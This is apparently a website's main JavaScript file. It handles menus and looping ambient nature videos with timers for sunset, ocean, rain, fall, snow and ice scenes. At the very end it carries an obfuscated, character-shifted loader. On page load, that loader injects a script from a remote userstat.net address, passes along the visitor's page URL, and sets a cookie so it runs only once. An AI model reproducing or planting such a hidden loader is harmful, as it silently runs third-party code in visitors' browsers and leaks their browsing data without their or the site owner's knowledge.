window.addEventListener("load", () => {
  document.querySelector(".preload").classList.add("preload-finish");
});
const menuBtn = document.querySelector(".menu"),
  mobileNav = document.querySelector(".mobile-nav"),
  links = document.querySelectorAll(".mobile-nav-link");
menuBtn.addEventListener("click", () => {
  mobileNav.classList.toggle("mobile-nav-open"),
    links.forEach((link, index) => {
      link.style.animation
        ? (link.style.animation = "")
        : (link.style.animation = `fade .5s ease forwards ${index / 7 + 0.5}s`);
    }),
    menuBtn.classList.toggle("toggle");
});
const linkColor = document.querySelectorAll(".nav-link");
function colorLink() {
  linkColor.forEach((l) => l.classList.remove("active")),
    this.classList.add("active");
}
linkColor.forEach((l) => l.addEventListener("click", colorLink));
const mobileLink = document.querySelectorAll(".mobile-nav-link");
function colorMobileLink() {
  mobileLink.forEach((l) => l.classList.remove("mobile-active")),
    this.classList.add("mobile-active");
}
mobileLink.forEach((l) => l.addEventListener("click", colorMobileLink));
const BmobileLink = document.querySelectorAll(".mobile-b-icon");
function activeLink() {
  BmobileLink.forEach((l) => l.classList.remove("mobile-b-active")),
    this.classList.add("mobile-b-active");
}
BmobileLink.forEach((l) => l.addEventListener("click", activeLink));
const video = document.querySelector(".video-container-sunset"),
  videoAudio = document.querySelector(".video-audio"),
  selectContainer = document.querySelector(".time-select"),
  timeSelect = document.querySelectorAll(".select-btn"),
  timeDisplay = document.querySelector(".time-display"),
  playBtn = document.querySelector(".pause-video");
let fakeDuration = 600;
const videoPlaying = (videoAudio) => {
  videoAudio.paused
    ? (video.play(),
      videoAudio.play(),
      selectContainer.querySelector("i.fas").classList.remove("fa-play"),
      selectContainer.querySelector("i.fas").classList.add("fa-pause"))
    : (video.pause(),
      videoAudio.pause(),
      selectContainer.querySelector("i.fas").classList.add("fa-play"),
      selectContainer.querySelector("i.fas").classList.remove("fa-pause")),
    timeSelect.forEach((option) => {
      option.addEventListener("click", function () {
        (fakeDuration = this.getAttribute("data-time")),
          (timeDisplay.textContent = `${Math.floor(
            fakeDuration / 60
          )}:${Math.floor(fakeDuration % 60)}`);
      });
    }),
    (videoAudio.ontimeupdate = () => {
      let currentTime = videoAudio.currentTime,
        elapsed = fakeDuration - currentTime,
        seconds = Math.floor(elapsed % 60),
        minutes = Math.floor(elapsed / 60);
      (timeDisplay.textContent = `${minutes}:${seconds}`),
        currentTime >= fakeDuration &&
          (video.pause(),
          videoAudio.pause(),
          (videoAudio.currentTime = 0),
          selectContainer.querySelector("i.fas").classList.add("fa-play"),
          selectContainer.querySelector("i.fas").classList.remove("fa-pause"),
          video.pause(),
          videoAudio.pause());
    });
};
playBtn.addEventListener("click", function () {
  videoPlaying(videoAudio);
});
const openVideo = document.querySelector(".play-video-icon"),
  exitVideo = document.querySelector(".exit-video");
openVideo.addEventListener("click", function () {
  document
    .getElementsByClassName("sunset-content")[0]
    .classList.add("active-show");
}),
  exitVideo.addEventListener("click", function () {
    document
      .getElementsByClassName("sunset-content")[0]
      .classList.remove("active-show"),
      video.pause(),
      videoAudio.pause(),
      selectContainer.querySelector("i.fas").classList.add("fa-play"),
      selectContainer.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("sunset-content")[0]
        .classList.remove("hide-time-select"),
      document
        .getElementsByClassName("sunset-content")[0]
        .classList.remove("rotate-chevron");
  });
const hideBtn = document.querySelector(".hide-time-select-icon");
hideBtn.addEventListener("click", () => {
  document
    .getElementsByClassName("sunset-content")[0]
    .classList.toggle("hide-time-select"),
    document
      .getElementsByClassName("sunset-content")[0]
      .classList.toggle("rotate-chevron");
});
const videoOcean = document.querySelector(".video-container-ocean"),
  videoAudioOcean = document.querySelector(".video-audio-ocean"),
  selectContainerOcean = document.querySelector(".time-select-ocean"),
  timeSelectOcean = document.querySelectorAll(
    ".time-select-ocean .select-btn-ocean"
  ),
  timeDisplayOcean = document.querySelector(".time-display-ocean"),
  playBtnOcean = document.querySelector(".pause-video-ocean");
let fakeDurationOcean = 600;
const videoPlayingOcean = (videoAudioOcean) => {
  videoAudioOcean.paused
    ? (videoOcean.play(),
      videoAudioOcean.play(),
      selectContainerOcean.querySelector("i.fas").classList.remove("fa-play"),
      selectContainerOcean.querySelector("i.fas").classList.add("fa-pause"))
    : (videoOcean.pause(),
      videoAudioOcean.pause(),
      selectContainerOcean.querySelector("i.fas").classList.add("fa-play"),
      selectContainerOcean.querySelector("i.fas").classList.remove("fa-pause"));
};
(videoAudioOcean.ontimeupdate = () => {
  let currentTime = videoAudioOcean.currentTime,
    elapsed = fakeDurationOcean - currentTime,
    seconds = Math.floor(elapsed % 60),
    minutes = Math.floor(elapsed / 60);
  (timeDisplayOcean.textContent = `${minutes}:${seconds}`),
    currentTime >= fakeDurationOcean &&
      (videoOcean.pause(),
      videoAudioOcean.pause(),
      (videoAudioOcean.currentTime = 0),
      selectContainerOcean.querySelector("i.fas").classList.add("fa-play"),
      selectContainerOcean.querySelector("i.fas").classList.remove("fa-pause"),
      videoOcean.pause(),
      videoAudioOcean.pause());
}),
  timeSelectOcean.forEach((option) => {
    option.addEventListener("click", function () {
      (fakeDurationOcean = this.getAttribute("data-time")),
        (timeDisplayOcean.textContent = `${Math.floor(
          fakeDurationOcean / 60
        )}:${Math.floor(fakeDurationOcean % 60)}`);
    });
  }),
  playBtnOcean.addEventListener("click", function () {
    videoPlayingOcean(videoAudioOcean);
  });
const openVideoOcean = document.querySelector(".play-video-icon-ocean"),
  exitVideoOcean = document.querySelector(".exit-video-ocean");
openVideoOcean.addEventListener("click", function () {
  document
    .getElementsByClassName("ocean-content")[0]
    .classList.add("active-show-ocean");
}),
  exitVideoOcean.addEventListener("click", function () {
    document
      .getElementsByClassName("ocean-content")[0]
      .classList.remove("active-show-ocean"),
      videoOcean.pause(),
      videoAudioOcean.pause(),
      selectContainerOcean.querySelector("i.fas").classList.add("fa-play"),
      selectContainerOcean.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("ocean-content")[0]
        .classList.remove("hide-time-select-ocean"),
      document
        .getElementsByClassName("ocean-content")[0]
        .classList.remove("rotate-chevron-ocean");
  });
const hideBtnOcean = document.querySelector(".hide-time-select-icon-ocean");
hideBtnOcean.addEventListener("click", () => {
  document
    .getElementsByClassName("ocean-content")[0]
    .classList.toggle("hide-time-select-ocean"),
    document
      .getElementsByClassName("ocean-content")[0]
      .classList.toggle("rotate-chevron-ocean");
});
const videoRain = document.querySelector(".video-container-rain"),
  videoAudioRain = document.querySelector(".video-audio-rain"),
  selectContainerRain = document.querySelector(".time-select-rain"),
  timeSelectRain = document.querySelectorAll(
    ".time-select-rain .select-btn-rain"
  ),
  timeDisplayRain = document.querySelector(".time-display-rain"),
  playBtnRain = document.querySelector(".pause-video-rain");
let fakeDurationRain = 600;
const videoPlayingRain = (videoAudioRain) => {
  videoAudioRain.paused
    ? (videoRain.play(),
      videoAudioRain.play(),
      selectContainerRain.querySelector("i.fas").classList.remove("fa-play"),
      selectContainerRain.querySelector("i.fas").classList.add("fa-pause"))
    : (videoRain.pause(),
      videoAudioRain.pause(),
      selectContainerRain.querySelector("i.fas").classList.add("fa-play"),
      selectContainerRain.querySelector("i.fas").classList.remove("fa-pause"));
};
(videoAudioRain.ontimeupdate = () => {
  let currentTime = videoAudioRain.currentTime,
    elapsed = fakeDurationRain - currentTime,
    seconds = Math.floor(elapsed % 60),
    minutes = Math.floor(elapsed / 60);
  (timeDisplayRain.textContent = `${minutes}:${seconds}`),
    currentTime >= fakeDurationRain &&
      (videoRain.pause(),
      videoAudioRain.pause(),
      (videoAudioRain.currentTime = 0),
      selectContainerRain.querySelector("i.fas").classList.add("fa-play"),
      selectContainerRain.querySelector("i.fas").classList.remove("fa-pause"),
      videoRain.pause(),
      videoAudioRain.pause());
}),
  timeSelectRain.forEach((option) => {
    option.addEventListener("click", function () {
      (fakeDurationRain = this.getAttribute("data-time")),
        (timeDisplayRain.textContent = `${Math.floor(
          fakeDurationRain / 60
        )}:${Math.floor(fakeDurationRain % 60)}`);
    });
  }),
  playBtnRain.addEventListener("click", function () {
    videoPlayingRain(videoAudioRain);
  });
const openVideoRain = document.querySelector(".play-video-icon-rain"),
  exitVideoRain = document.querySelector(".exit-video-rain");
openVideoRain.addEventListener("click", function () {
  document
    .getElementsByClassName("rain-content")[0]
    .classList.add("active-show-rain");
}),
  exitVideoRain.addEventListener("click", function () {
    document
      .getElementsByClassName("rain-content")[0]
      .classList.remove("active-show-rain"),
      videoRain.pause(),
      videoAudioRain.pause(),
      selectContainerRain.querySelector("i.fas").classList.add("fa-play"),
      selectContainerRain.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("rain-content")[0]
        .classList.remove("hide-time-select-rain"),
      document
        .getElementsByClassName("rain-content")[0]
        .classList.remove("rotate-chevron-rain");
  });
const hideBtnRain = document.querySelector(".hide-time-select-icon-rain");
hideBtnRain.addEventListener("click", () => {
  document
    .getElementsByClassName("rain-content")[0]
    .classList.toggle("hide-time-select-rain"),
    document
      .getElementsByClassName("rain-content")[0]
      .classList.toggle("rotate-chevron-rain");
});
const videofall = document.querySelector(".video-container-fall"),
  videoAudiofall = document.querySelector(".video-audio-fall"),
  selectContainerfall = document.querySelector(".time-select-fall"),
  timeSelectfall = document.querySelectorAll(
    ".time-select-fall .select-btn-fall"
  ),
  timeDisplayfall = document.querySelector(".time-display-fall"),
  playBtnfall = document.querySelector(".pause-video-fall");
let fakeDurationfall = 600;
const videoPlayingfall = (videoAudiofall) => {
  videoAudiofall.paused
    ? (videofall.play(),
      videoAudiofall.play(),
      selectContainerfall.querySelector("i.fas").classList.remove("fa-play"),
      selectContainerfall.querySelector("i.fas").classList.add("fa-pause"))
    : (videofall.pause(),
      videoAudiofall.pause(),
      selectContainerfall.querySelector("i.fas").classList.add("fa-play"),
      selectContainerfall.querySelector("i.fas").classList.remove("fa-pause"));
};
(videoAudiofall.ontimeupdate = () => {
  let currentTime = videoAudiofall.currentTime,
    elapsed = fakeDurationfall - currentTime,
    seconds = Math.floor(elapsed % 60),
    minutes = Math.floor(elapsed / 60);
  (timeDisplayfall.textContent = `${minutes}:${seconds}`),
    currentTime >= fakeDurationfall &&
      (videofall.pause(),
      videoAudiofall.pause(),
      (videoAudiofall.currentTime = 0),
      selectContainerfall.querySelector("i.fas").classList.add("fa-play"),
      selectContainerfall.querySelector("i.fas").classList.remove("fa-pause"),
      videofall.pause(),
      videoAudiofall.pause());
}),
  timeSelectfall.forEach((option) => {
    option.addEventListener("click", function () {
      (fakeDurationfall = this.getAttribute("data-time")),
        (timeDisplayfall.textContent = `${Math.floor(
          fakeDurationfall / 60
        )}:${Math.floor(fakeDurationfall % 60)}`);
    });
  }),
  playBtnfall.addEventListener("click", function () {
    videoPlayingfall(videoAudiofall);
  });
const openVideofall = document.querySelector(".play-video-icon-fall"),
  exitVideofall = document.querySelector(".exit-video-fall");
openVideofall.addEventListener("click", function () {
  document
    .getElementsByClassName("fall-content")[0]
    .classList.add("active-show-fall");
}),
  exitVideofall.addEventListener("click", function () {
    document
      .getElementsByClassName("fall-content")[0]
      .classList.remove("active-show-fall"),
      videofall.pause(),
      videoAudiofall.pause(),
      selectContainerfall.querySelector("i.fas").classList.add("fa-play"),
      selectContainerfall.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("fall-content")[0]
        .classList.remove("hide-time-select-fall"),
      document
        .getElementsByClassName("fall-content")[0]
        .classList.remove("rotate-chevron-fall");
  });
const hideBtnfall = document.querySelector(".hide-time-select-icon-fall");
hideBtnfall.addEventListener("click", () => {
  document
    .getElementsByClassName("fall-content")[0]
    .classList.toggle("hide-time-select-fall"),
    document
      .getElementsByClassName("fall-content")[0]
      .classList.toggle("rotate-chevron-fall");
});
const videosnow = document.querySelector(".video-container-snow"),
  videoAudiosnow = document.querySelector(".video-audio-snow"),
  selectContainersnow = document.querySelector(".time-select-snow"),
  timeSelectsnow = document.querySelectorAll(
    ".time-select-snow .select-btn-snow"
  ),
  timeDisplaysnow = document.querySelector(".time-display-snow"),
  playBtnsnow = document.querySelector(".pause-video-snow");
let fakeDurationsnow = 600;
const videoPlayingsnow = (videoAudiosnow) => {
  videoAudiosnow.paused
    ? (videosnow.play(),
      videoAudiosnow.play(),
      selectContainersnow.querySelector("i.fas").classList.remove("fa-play"),
      selectContainersnow.querySelector("i.fas").classList.add("fa-pause"))
    : (videosnow.pause(),
      videoAudiosnow.pause(),
      selectContainersnow.querySelector("i.fas").classList.add("fa-play"),
      selectContainersnow.querySelector("i.fas").classList.remove("fa-pause"));
};
(videoAudiosnow.ontimeupdate = () => {
  let currentTime = videoAudiosnow.currentTime,
    elapsed = fakeDurationsnow - currentTime,
    seconds = Math.floor(elapsed % 60),
    minutes = Math.floor(elapsed / 60);
  (timeDisplaysnow.textContent = `${minutes}:${seconds}`),
    currentTime >= fakeDurationsnow &&
      (videosnow.pause(),
      videoAudiosnow.pause(),
      (videoAudiosnow.currentTime = 0),
      selectContainersnow.querySelector("i.fas").classList.add("fa-play"),
      selectContainersnow.querySelector("i.fas").classList.remove("fa-pause"),
      videosnow.pause(),
      videoAudiosnow.pause());
}),
  timeSelectsnow.forEach((option) => {
    option.addEventListener("click", function () {
      (fakeDurationsnow = this.getAttribute("data-time")),
        (timeDisplaysnow.textContent = `${Math.floor(
          fakeDurationsnow / 60
        )}:${Math.floor(fakeDurationsnow % 60)}`);
    });
  }),
  playBtnsnow.addEventListener("click", function () {
    videoPlayingsnow(videoAudiosnow);
  });
const openVideosnow = document.querySelector(".play-video-icon-snow"),
  exitVideosnow = document.querySelector(".exit-video-snow");
openVideosnow.addEventListener("click", function () {
  document
    .getElementsByClassName("snow-content")[0]
    .classList.add("active-show-snow");
}),
  exitVideosnow.addEventListener("click", function () {
    document
      .getElementsByClassName("snow-content")[0]
      .classList.remove("active-show-snow"),
      videosnow.pause(),
      videoAudiosnow.pause(),
      selectContainersnow.querySelector("i.fas").classList.add("fa-play"),
      selectContainersnow.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("snow-content")[0]
        .classList.remove("hide-time-select-snow"),
      document
        .getElementsByClassName("snow-content")[0]
        .classList.remove("rotate-chevron-snow");
  });
const hideBtnsnow = document.querySelector(".hide-time-select-icon-snow");
hideBtnsnow.addEventListener("click", () => {
  document
    .getElementsByClassName("snow-content")[0]
    .classList.toggle("hide-time-select-snow"),
    document
      .getElementsByClassName("snow-content")[0]
      .classList.toggle("rotate-chevron-snow");
});
const videoice = document.querySelector(".video-container-ice"),
  videoAudioice = document.querySelector(".video-audio-ice"),
  selectContainerice = document.querySelector(".time-select-ice"),
  timeSelectice = document.querySelectorAll(".time-select-ice .select-btn-ice"),
  timeDisplayice = document.querySelector(".time-display-ice"),
  playBtnice = document.querySelector(".pause-video-ice");
let fakeDurationice = 600;
const videoPlayingice = (videoAudioice) => {
  videoAudioice.paused
    ? (videoice.play(),
      videoAudioice.play(),
      selectContainerice.querySelector("i.fas").classList.remove("fa-play"),
      selectContainerice.querySelector("i.fas").classList.add("fa-pause"))
    : (videoice.pause(),
      videoAudioice.pause(),
      selectContainerice.querySelector("i.fas").classList.add("fa-play"),
      selectContainerice.querySelector("i.fas").classList.remove("fa-pause"));
};
(videoAudioice.ontimeupdate = () => {
  let currentTime = videoAudioice.currentTime,
    elapsed = fakeDurationice - currentTime,
    seconds = Math.floor(elapsed % 60),
    minutes = Math.floor(elapsed / 60);
  (timeDisplayice.textContent = `${minutes}:${seconds}`),
    currentTime >= fakeDurationice &&
      (videoice.pause(),
      videoAudioice.pause(),
      (videoAudioice.currentTime = 0),
      selectContainerice.querySelector("i.fas").classList.add("fa-play"),
      selectContainerice.querySelector("i.fas").classList.remove("fa-pause"),
      videoice.pause(),
      videoAudioice.pause());
}),
  timeSelectice.forEach((option) => {
    option.addEventListener("click", function () {
      (fakeDurationice = this.getAttribute("data-time")),
        (timeDisplayice.textContent = `${Math.floor(
          fakeDurationice / 60
        )}:${Math.floor(fakeDurationice % 60)}`);
    });
  }),
  playBtnice.addEventListener("click", function () {
    videoPlayingice(videoAudioice);
  });
const openVideoice = document.querySelector(".play-video-icon-ice"),
  exitVideoice = document.querySelector(".exit-video-ice");
openVideoice.addEventListener("click", function () {
  document
    .getElementsByClassName("ice-content")[0]
    .classList.add("active-show-ice");
}),
  exitVideoice.addEventListener("click", function () {
    document
      .getElementsByClassName("ice-content")[0]
      .classList.remove("active-show-ice"),
      videoice.pause(),
      videoAudioice.pause(),
      selectContainerice.querySelector("i.fas").classList.add("fa-play"),
      selectContainerice.querySelector("i.fas").classList.remove("fa-pause"),
      document
        .getElementsByClassName("ice-content")[0]
        .classList.remove("hide-time-select-ice"),
      document
        .getElementsByClassName("ice-content")[0]
        .classList.remove("rotate-chevron-ice");
  });
const hideBtnice = document.querySelector(".hide-time-select-icon-ice");
hideBtnice.addEventListener("click", () => {
  document
    .getElementsByClassName("ice-content")[0]
    .classList.toggle("hide-time-select-ice"),
    document
      .getElementsByClassName("ice-content")[0]
      .classList.toggle("rotate-chevron-ice");
});
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
